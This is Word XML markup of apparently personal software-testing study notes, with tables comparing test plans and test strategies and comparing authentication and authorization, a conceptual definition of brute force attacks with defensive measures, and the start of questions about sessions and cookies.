              <w:t>Difference between Test Strategy and Test Plan</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:vertAnchor="text" w:horzAnchor="page" w:tblpX="1" w:tblpY="265"/>
              <w:tblW w:w="116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330"/>
              <w:gridCol w:w="7339"/>
            </w:tblGrid>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="489"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="4330" w:type="dxa"/>
                  <w:tcBorders>
                    <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
                    <w:left w:val="single" w:sz="4" w:space="0" w:color="auto"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
                  <w:tcMar>
                    <w:top w:w="100" w:type="dxa"/>
                    <w:left w:w="100" w:type="dxa"/>
                    <w:bottom w:w="100" w:type="dxa"/>
                    <w:right w:w="100" w:type="dxa"/>
                  </w:tcMar>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
                  <w:pPr>
                    <w:spacing w:after="250" w:line="250" w:lineRule="atLeast"/>
                    <w:jc w:val="center"/>
                    <w:rPr>
                      <w:b/>
                      <w:bCs/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:b/>
                      <w:bCs/>
                    </w:rPr>
                    <w:t>Test Plan</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="7339" w:type="dxa"/>
                  <w:tcBorders>
                    <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
                    <w:left w:val="single" w:sz="4" w:space="0" w:color="auto"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
                  <w:tcMar>
                    <w:top w:w="100" w:type="dxa"/>
                    <w:left w:w="100" w:type="dxa"/>
                    <w:bottom w:w="100" w:type="dxa"/>
                    <w:right w:w="100" w:type="dxa"/>
                  </w:tcMar>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
                  <w:pPr>
                    <w:spacing w:after="250" w:line="250" w:lineRule="atLeast"/>
                    <w:jc w:val="center"/>
                    <w:rPr>
                      <w:b/>
                      <w:bCs/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:b/>
                      <w:bCs/>
                    </w:rPr>
                    <w:t>Test Strategy</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="1769"/>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57"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>A test plan for software project can be defined as a document that defines the scope, objective, approach and emphasis on a software testing effort</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Pr="00132184" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
                  <w:pPr>
                    <w:numPr>
                      <w:ilvl w:val="0"/>
                      <w:numId w:val="58"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Test strategy is a set of guidelines that explains test design and determines how testing needs to be done</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="2270"/>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59"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:lastRenderedPageBreak/>
                    <w:t>Components of Test plan include- Test plan id, features to be tested, test techniques, testing tasks, features pass or fail criteria, test deliverables, responsibilities, and schedule, etc.</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60"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Components of Test strategy includes- objectives and scope, documentation formats, test processes, team reporting structure, client communication strategy, etc.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="1513"/>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61"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Test plan is carried out by a testing manager or lead that describes how to test, when to test, who will test and what to test</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62"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>A test strategy is carried out by the project manager. It says what type of technique to follow and which module to test</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="768"/>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63"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Test plan narrates about the specification</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64"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Test strategy narrates about the general approaches</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="523"/>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65"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Test plan can change</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66"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Test strategy cannot be changed</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="1269"/>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67"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>Test planning is done to determine possible issues and dependencies in order to identify the risks.</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68"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t xml:space="preserve">It is a long-term plan of </w:t>
                  </w:r>
                  <w:proofErr w:type="spellStart"/>
                  <w:r>
                    <w:t>action.You</w:t>
                  </w:r>
                  <w:proofErr w:type="spellEnd"/>
                  <w:r>
                    <w:t xml:space="preserve"> can abstract information that is not project specific and put it into test approach</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="134"/>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69"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>A test plan exists individually</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EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
                  <w:pPr>
                    <w:numPr>
                      <w:ilvl w:val="0"/>
                      <w:numId w:val="70"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>In smaller project, test strategy is often found as a section of a test plan</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:trHeight w:val="134"/>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71"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>It is defined at project level</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EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
                  <w:pPr>
                    <w:numPr>
                      <w:ilvl w:val="0"/>
                      <w:numId w:val="72"/>
                    </w:numPr>
                    <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>It is set at organization level and can be used by multiple projects</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002524AE">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>Security Testing:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="002524AE" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002524AE">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>http://www.softwaretestinghelp.com/how-to-test-application-security-web-and-desktop-application-security-testing-techniques/</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D2166">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>http://www.softwaretestinghelp.com/security-testing-of-web-applications/</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading1"/>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">Brute Force Attack </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading2"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Definition - What does </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="it"/>
              </w:rPr>
              <w:t>Brute Force Attack</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> mean? </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">A brute force attack is a trial-and-error method used to obtain information such as a user password or personal identification number (PIN). In a brute force attack, automated software is used to generate a large number of consecutive guesses as to the value of the desired data. Brute force attacks may be used by criminals to crack encrypted data, or by security analysts to test an organization's network security. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">A brute force attack is also known as brute force cracking or simply brute force. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading2"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>Techopedia</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:t xml:space="preserve"> explains </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="it"/>
              </w:rPr>
              <w:t>Brute Force Attack</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">One example of a type of brute force attack is known as a dictionary attack, which might try all the words in a dictionary. Other forms of brute force attack might try commonly-used passwords or combinations of letters and numbers. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">An attack of this nature can be </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:t>time- and resource-consuming</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:t xml:space="preserve">. Hence the name "brute force attack;" success is usually based on computing power and the number of combinations tried rather than an ingenious algorithm. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">The following measures can be used to defend against brute force attacks: </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="73"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:t>Requiring users to create complex passwords</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="73"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:t>Limiting the number of times a user can unsuccessfully attempt to log in</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="73"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:t>Temporarily locking out users who exceed the specified maximum number of failed login attempts</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading2"/>
            </w:pPr>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:t>Difference between authentication and authorization.</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0"/>
              <w:gridCol w:w="3961"/>
            </w:tblGrid>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:tblCellSpacing w:w="15" w:type="dxa"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:jc w:val="center"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:b/>
                      <w:bCs/>
                    </w:rPr>
                    <w:t>Authentication</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:jc w:val="center"/>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:b/>
                      <w:bCs/>
                    </w:rPr>
                    <w:t>Authorization</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:tblCellSpacing w:w="15" w:type="dxa"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>It is the process of verifying the identity of a user.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>It is the process of checking whether the user has the access rights to the system.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:tblCellSpacing w:w="15" w:type="dxa"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>It always proceeds to authorization.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>It is the process of allowing an authenticated user access to resources.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:tblCellSpacing w:w="15" w:type="dxa"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t xml:space="preserve">It has two separate levels because all the requests coming through the IIS before it </w:t>
                  </w:r>
                  <w:proofErr w:type="gramStart"/>
                  <w:r>
                    <w:t>is</w:t>
                  </w:r>
                  <w:proofErr w:type="gramEnd"/>
                  <w:r>
                    <w:t xml:space="preserve"> handled.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>It allows two ways to authorize the access to a given resources.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidTr="00BC3F7A">
              <w:trPr>
                <w:tblCellSpacing w:w="15" w:type="dxa"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:lastRenderedPageBreak/>
                    <w:t>They have additional schemes like windows authentication, forms authentication and passport authentication.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00BC3F7A">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:t>The two ways are URL authorization and File authorization</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w:rsidR="00EC39D9" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00C55750" w:rsidRPr="00C55750" w:rsidRDefault="00C55750" w:rsidP="00C55750">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C55750">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
              <w:t xml:space="preserve">Can we use session and cookies together </w:t>
            </w:r>
            <w:r w:rsidR="00F91E5E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
              <w:t>if yes then when</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00C55750" w:rsidRPr="00C55750" w:rsidRDefault="00C55750" w:rsidP="00C55750">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C55750">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:color w:val="4A5458"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="lightGray"/>
              </w:rPr>
              <w:t>Which is best session or cookie</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00C55750" w:rsidRPr="00C55750" w:rsidRDefault="00C55750" w:rsidP="00C55750">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
